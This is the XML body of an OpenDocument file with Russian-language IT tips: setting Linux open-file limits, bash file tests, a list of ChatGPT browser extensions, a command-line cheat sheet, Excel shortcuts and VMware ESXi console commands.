      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">vi</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sysctl</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавьте следующую команду:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">fs</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">max</text:span><text:span text:style-name="T1">=500000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cat</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">proc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sys</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fs</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">sysctl</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">p</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установка количества открытых файлов для пользователя в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">.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3">root</text:span><text:span text:style-name="T1">, вам необходимо отредактировать следующий файл:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">vi</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">security</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">limits</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если вы администратор </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">,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text:span text:style-name="T1">Команды, которые вы должны добавить, имеют следующие параметры:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">domain</text:span><text:span text:style-name="T1">&gt; </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">type</text:span><text:span text:style-name="T1">&gt; </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">item</text:span><text:span text:style-name="T1">&gt; </text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">value</text:span><text:span text:style-name="T1">&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вот пример установки </text:span><text:span text:style-name="T3">Soft</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">Hard</text:span><text:span text:style-name="T1"> лимитов для пользователя </text:span><text:span text:style-name="T3">dimon</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">## Example hard limit for max opened files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dimon hard nofile 4096</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">## Example soft limit for max opened files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">dimon soft nofile 1024</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Bash. </text:span><text:span text:style-name="T1">Проверки</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файлов</text:span><text:span text:style-name="T3">. K</text:span><text:span text:style-name="T1">оманды позволяют проверять различные условия, касающиеся файлов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл, и является ли он директорией.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">e</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл, и является ли он файлом.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл, и доступен ли он для чтения.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл, и не является ли он пустым.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл, и доступен ли он для записи.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">x</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл, и является ли он исполняемым.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 -</text:span><text:span text:style-name="T3">nt</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">2 # Проверяет, новее ли </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1, чем </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">2.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 -</text:span><text:span text:style-name="T3">ot</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">2 # Проверяет, старше ли </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1, чем </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">2.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">O</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл, и является ли его владельцем текущий пользователь.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">G</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> # Проверяет, существует ли файл, и соответствует ли его идентификатор группы идентификатору группы текущего пользователя.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#!/</text:span><text:span text:style-name="T3">bin</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">bash</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">mydir</text:span><text:span text:style-name="T1">=/</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">likegeeks</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">if</text:span><text:span text:style-name="T1"> [ -</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1"> $</text:span><text:span text:style-name="T3">mydir</text:span><text:span text:style-name="T1"> ] <text:s text:c="19"/># если файл сущетсвует и он является директорией</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">then</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo "The $mydir directory exists" # выводим сообщение</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cd</text:span><text:span text:style-name="T1"> $</text:span><text:span text:style-name="T3">mydir</text:span><text:span text:style-name="T1"> <text:s text:c="25"/># переходим в него </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> <text:s text:c="33"/># отображаем содержимое</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">else <text:s text:c="31"/># ИНАЧЕ</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo "The $mydir directory does not exist"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T2"><text:span text:style-name="T3">fi</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка </text:span><text:span text:style-name="T3">Chat</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">GPT</text:span><text:span text:style-name="T1"> расширений для браузера:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. </text:span><text:span text:style-name="T3">DetectGPT</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">chrome</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">google</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">webstore</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">detail</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">detectgpt</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">detect</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">chat</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">gpt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">oadkgbgppkhoaaoepjbcnjejmkknaobg</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">related</text:span><text:span text:style-name="T1">) - определяет текст, написанный нейросетью. (</text:span><text:span text:style-name="T3">Chrome</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. </text:span><text:span text:style-name="T3">CheatScrub</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">GPT</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Detector</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">addons</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">mozilla</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">org</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">en</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">US</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">firefox</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">addon</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">cheatscrub</text:span><text:span text:style-name="T1">/) - аналогичный аддон, но с более широким функционалом. (</text:span><text:span text:style-name="T3">Firefox</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. </text:span><text:span text:style-name="T3">ChatGPT</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">for</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Search</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Engines</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">chatonai</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">org</text:span><text:span text:style-name="T1">/) - интеграция </text:span><text:span text:style-name="T3">ChatGPT</text:span><text:span text:style-name="T1"> в поисковую строку браузера. (</text:span><text:span text:style-name="T3">Chrome</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Firefox</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Edge</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. </text:span><text:span text:style-name="T3">Ghostwrite</text:span><text:span text:style-name="T1">: </text:span><text:span text:style-name="T3">ChatGPT</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Email</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Assistant</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">chrome</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">google</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">webstore</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">detail</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">ghostwrite</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">chatgpt</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">email</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fbjnnjochaopepfjpngghafgnafebkjh</text:span><text:span text:style-name="T1">) - умный почтовый помощник, пишущий письма. (С</text:span><text:span text:style-name="T3">hrome</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5. </text:span><text:span text:style-name="T3">Casper</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">AI</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">chrome</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">google</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">webstore</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">detail</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">casper</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">ai</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fgfiokgecpkambjildjleljjcihnocel</text:span><text:span text:style-name="T1">) - умный помощник для различных задач. Например, может сделать саммари из статьи. (</text:span><text:span text:style-name="T3">Chrome</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">6. </text:span><text:span text:style-name="T3">ChatGPT</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Writer</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">chatgptwriter</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">ai</text:span><text:span text:style-name="T1">/) - работает на всех страницах, исправляет ошибки, пишет тексты, саммари и т.д. (</text:span><text:span text:style-name="T3">Chrome</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">7. </text:span><text:span text:style-name="T3">GPT</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">for</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Sheets</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">workspace</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">google</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">marketplace</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">gpt</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">for</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">sheets</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">and</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">docs</text:span><text:span text:style-name="T1">/677318054654) - гугл-таблицы на стероидах. (</text:span><text:span text:style-name="T3">Chrome</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">8. </text:span><text:span text:style-name="T3">ChatGPT</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">for</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">YouTube</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">chatgpt</text:span><text:span text:style-name="T1">4</text:span><text:span text:style-name="T3">youtube</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">ru</text:span><text:span text:style-name="T1">) - делает краткое содержание </text:span><text:span text:style-name="T3">YouTube</text:span><text:span text:style-name="T1"> роликов. (С</text:span><text:span text:style-name="T3">hrome</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">9. </text:span><text:span text:style-name="T3">ChatGPT</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">File</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Uploader</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Extended</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">chrome</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">google</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">webstore</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">detail</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">chatgpt</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">uploader</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">ext</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">becfinhbfclcgokjlobojlnldbfillpf</text:span><text:span text:style-name="T1">) - позволяет загружать файлы в </text:span><text:span text:style-name="T3">ChatGPT</text:span><text:span text:style-name="T1">. (</text:span><text:span text:style-name="T3">Chrome</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">10. </text:span><text:span text:style-name="T3">editGPT</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">editgpt</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1">/) - позволяет редактировать текст, выдаваемый нейросетью. (</text:span><text:span text:style-name="T3">Chrome</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Firefox</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Edge</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T1">Шпаргалка по работе в командной строке. Команды для работы с файлами:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ls - вывод содержимого каталога;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ls -la - вывод содержимого каталога в форматированном виде (в т.ч. скрытые файлы);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cd dir - перейти в каталог dir;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cd - перейти в домашний каталог;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">pwd - показать текущий каталог;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkdir dir - создать каталог dir;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rm file - удалить файл;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rm -r dir - удалить каталог dir;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rm -f file - принудительно удалить файл;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rm -rf dir - принудительно удалить каталог dir;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cp file1 file2 - </text:span><text:span text:style-name="T1">скопировать</text:span><text:span text:style-name="T3"> file1 </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> file2;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cp -r dir1 dir2 - скопировать каталог dir1 в каталог dir2 (если каталога dir2 нет, он будет создан);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mv file1 file2 - переместить (или переименовать, если file1 и file2 находятся в одном каталоге) file1 в file2;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ln -s file link - </text:span><text:span text:style-name="T1">создать</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">симлинк</text:span><text:span text:style-name="T3"> link </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файл</text:span><text:span text:style-name="T3"> file;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">touch file - создать файл;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cat &gt; file - направить стандартный ввод в file;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">more file - вывод содержимого file;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">head file - вывод содержимого первых 10 строк file;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tail file - вывод содержимого последних 10 строк file;</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">tail -f file - вывод содержимого file по мере появления, начиная с последних 10 строк файла.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5 хаков в Microsoft Excel, которые ускорят работу. Для всех, кто перестал бояться таблиц и полюбил Excel, собрали самые удачные подсказки по работе в нем:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">- Как быстро поменять местами столбцы или строки?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">- Как не печатать запятые в десятичной дроби?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">- Как легко растянуть колонки под размер содержимого?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Выделите нужные ячейки, нажмите Alt, H, O, I.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">- Как разнести значения в одной ячейке по нескольким?</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">- Как сложить данные во всех строках (еще проще, чем вбить формулу в одну ячейку и растянуть на остальные)?</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Зажмите Ctrl, выделите все нужные ячейки, нажмите Alt =.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как найти количество открытых файлов в Linux. Значение сохраняется в</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># cat /proc/sys/fs/file-max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка Hard лимит в Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка Soft лимит в Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># ulimit -Sn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># su root</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ulimit -Sn</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">$ ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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1" loext:marker-style-name="T2"><text:span text:style-name="T3"># sysctl -w fs.file-max=500000</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вы можете проверить текущее значение для количества открытых файлов с помощью следующей команды:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ cat /proc/sys/fs/file-max</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># vi /etc/sysctl.conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавьте следующую команду:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">fs.file-max=500000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># cat /proc/sys/fs/file-max</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T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8"><text:span text:style-name="T1"># sysctl -p</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># vi /etc/security/limits.conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">&lt;domain&gt;        &lt;type&gt;  &lt;item&gt;  &lt;value&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вот пример установки Soft и Hard лимитов для пользователя dimon:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">## Example hard limit for max opened files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dimon hard nofile 4096</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">## Example soft limit for max opened files</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">dimon soft nofile 1024</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Список полезных консольных команд VMWare ESXi (в том числе ESXCLI):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">reboot - перезагрузить хост</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">poweroff - выключить хост</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">esxcli system version get - </text:span><text:span text:style-name="T1">узнать</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">версию</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">(номер) инсталлированной версии VMware ESXi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">uname -a - так же узнать версию VMware ESXi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">vmware –vl - и еще один способ узнать версию и релиз VMware ESXi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcli hardware pci list | more - полная информация об установленных PCI устройствах</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">lspci - краткая информация обо всех установленных PCI устройствах</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxtop - диспетчер процессов top для vmware esxi (быстрые клавиши для переключения дисплея: c :cpu, i :interrupt, m :memory, n :network, d :disk adapter, u :disk device, v :disk VM, p :power mgmt)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">vmkerrcode -l - расшифровка кодов ошибок</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcfg-nics -l - информация о сетевых картах</text:span></text:p>
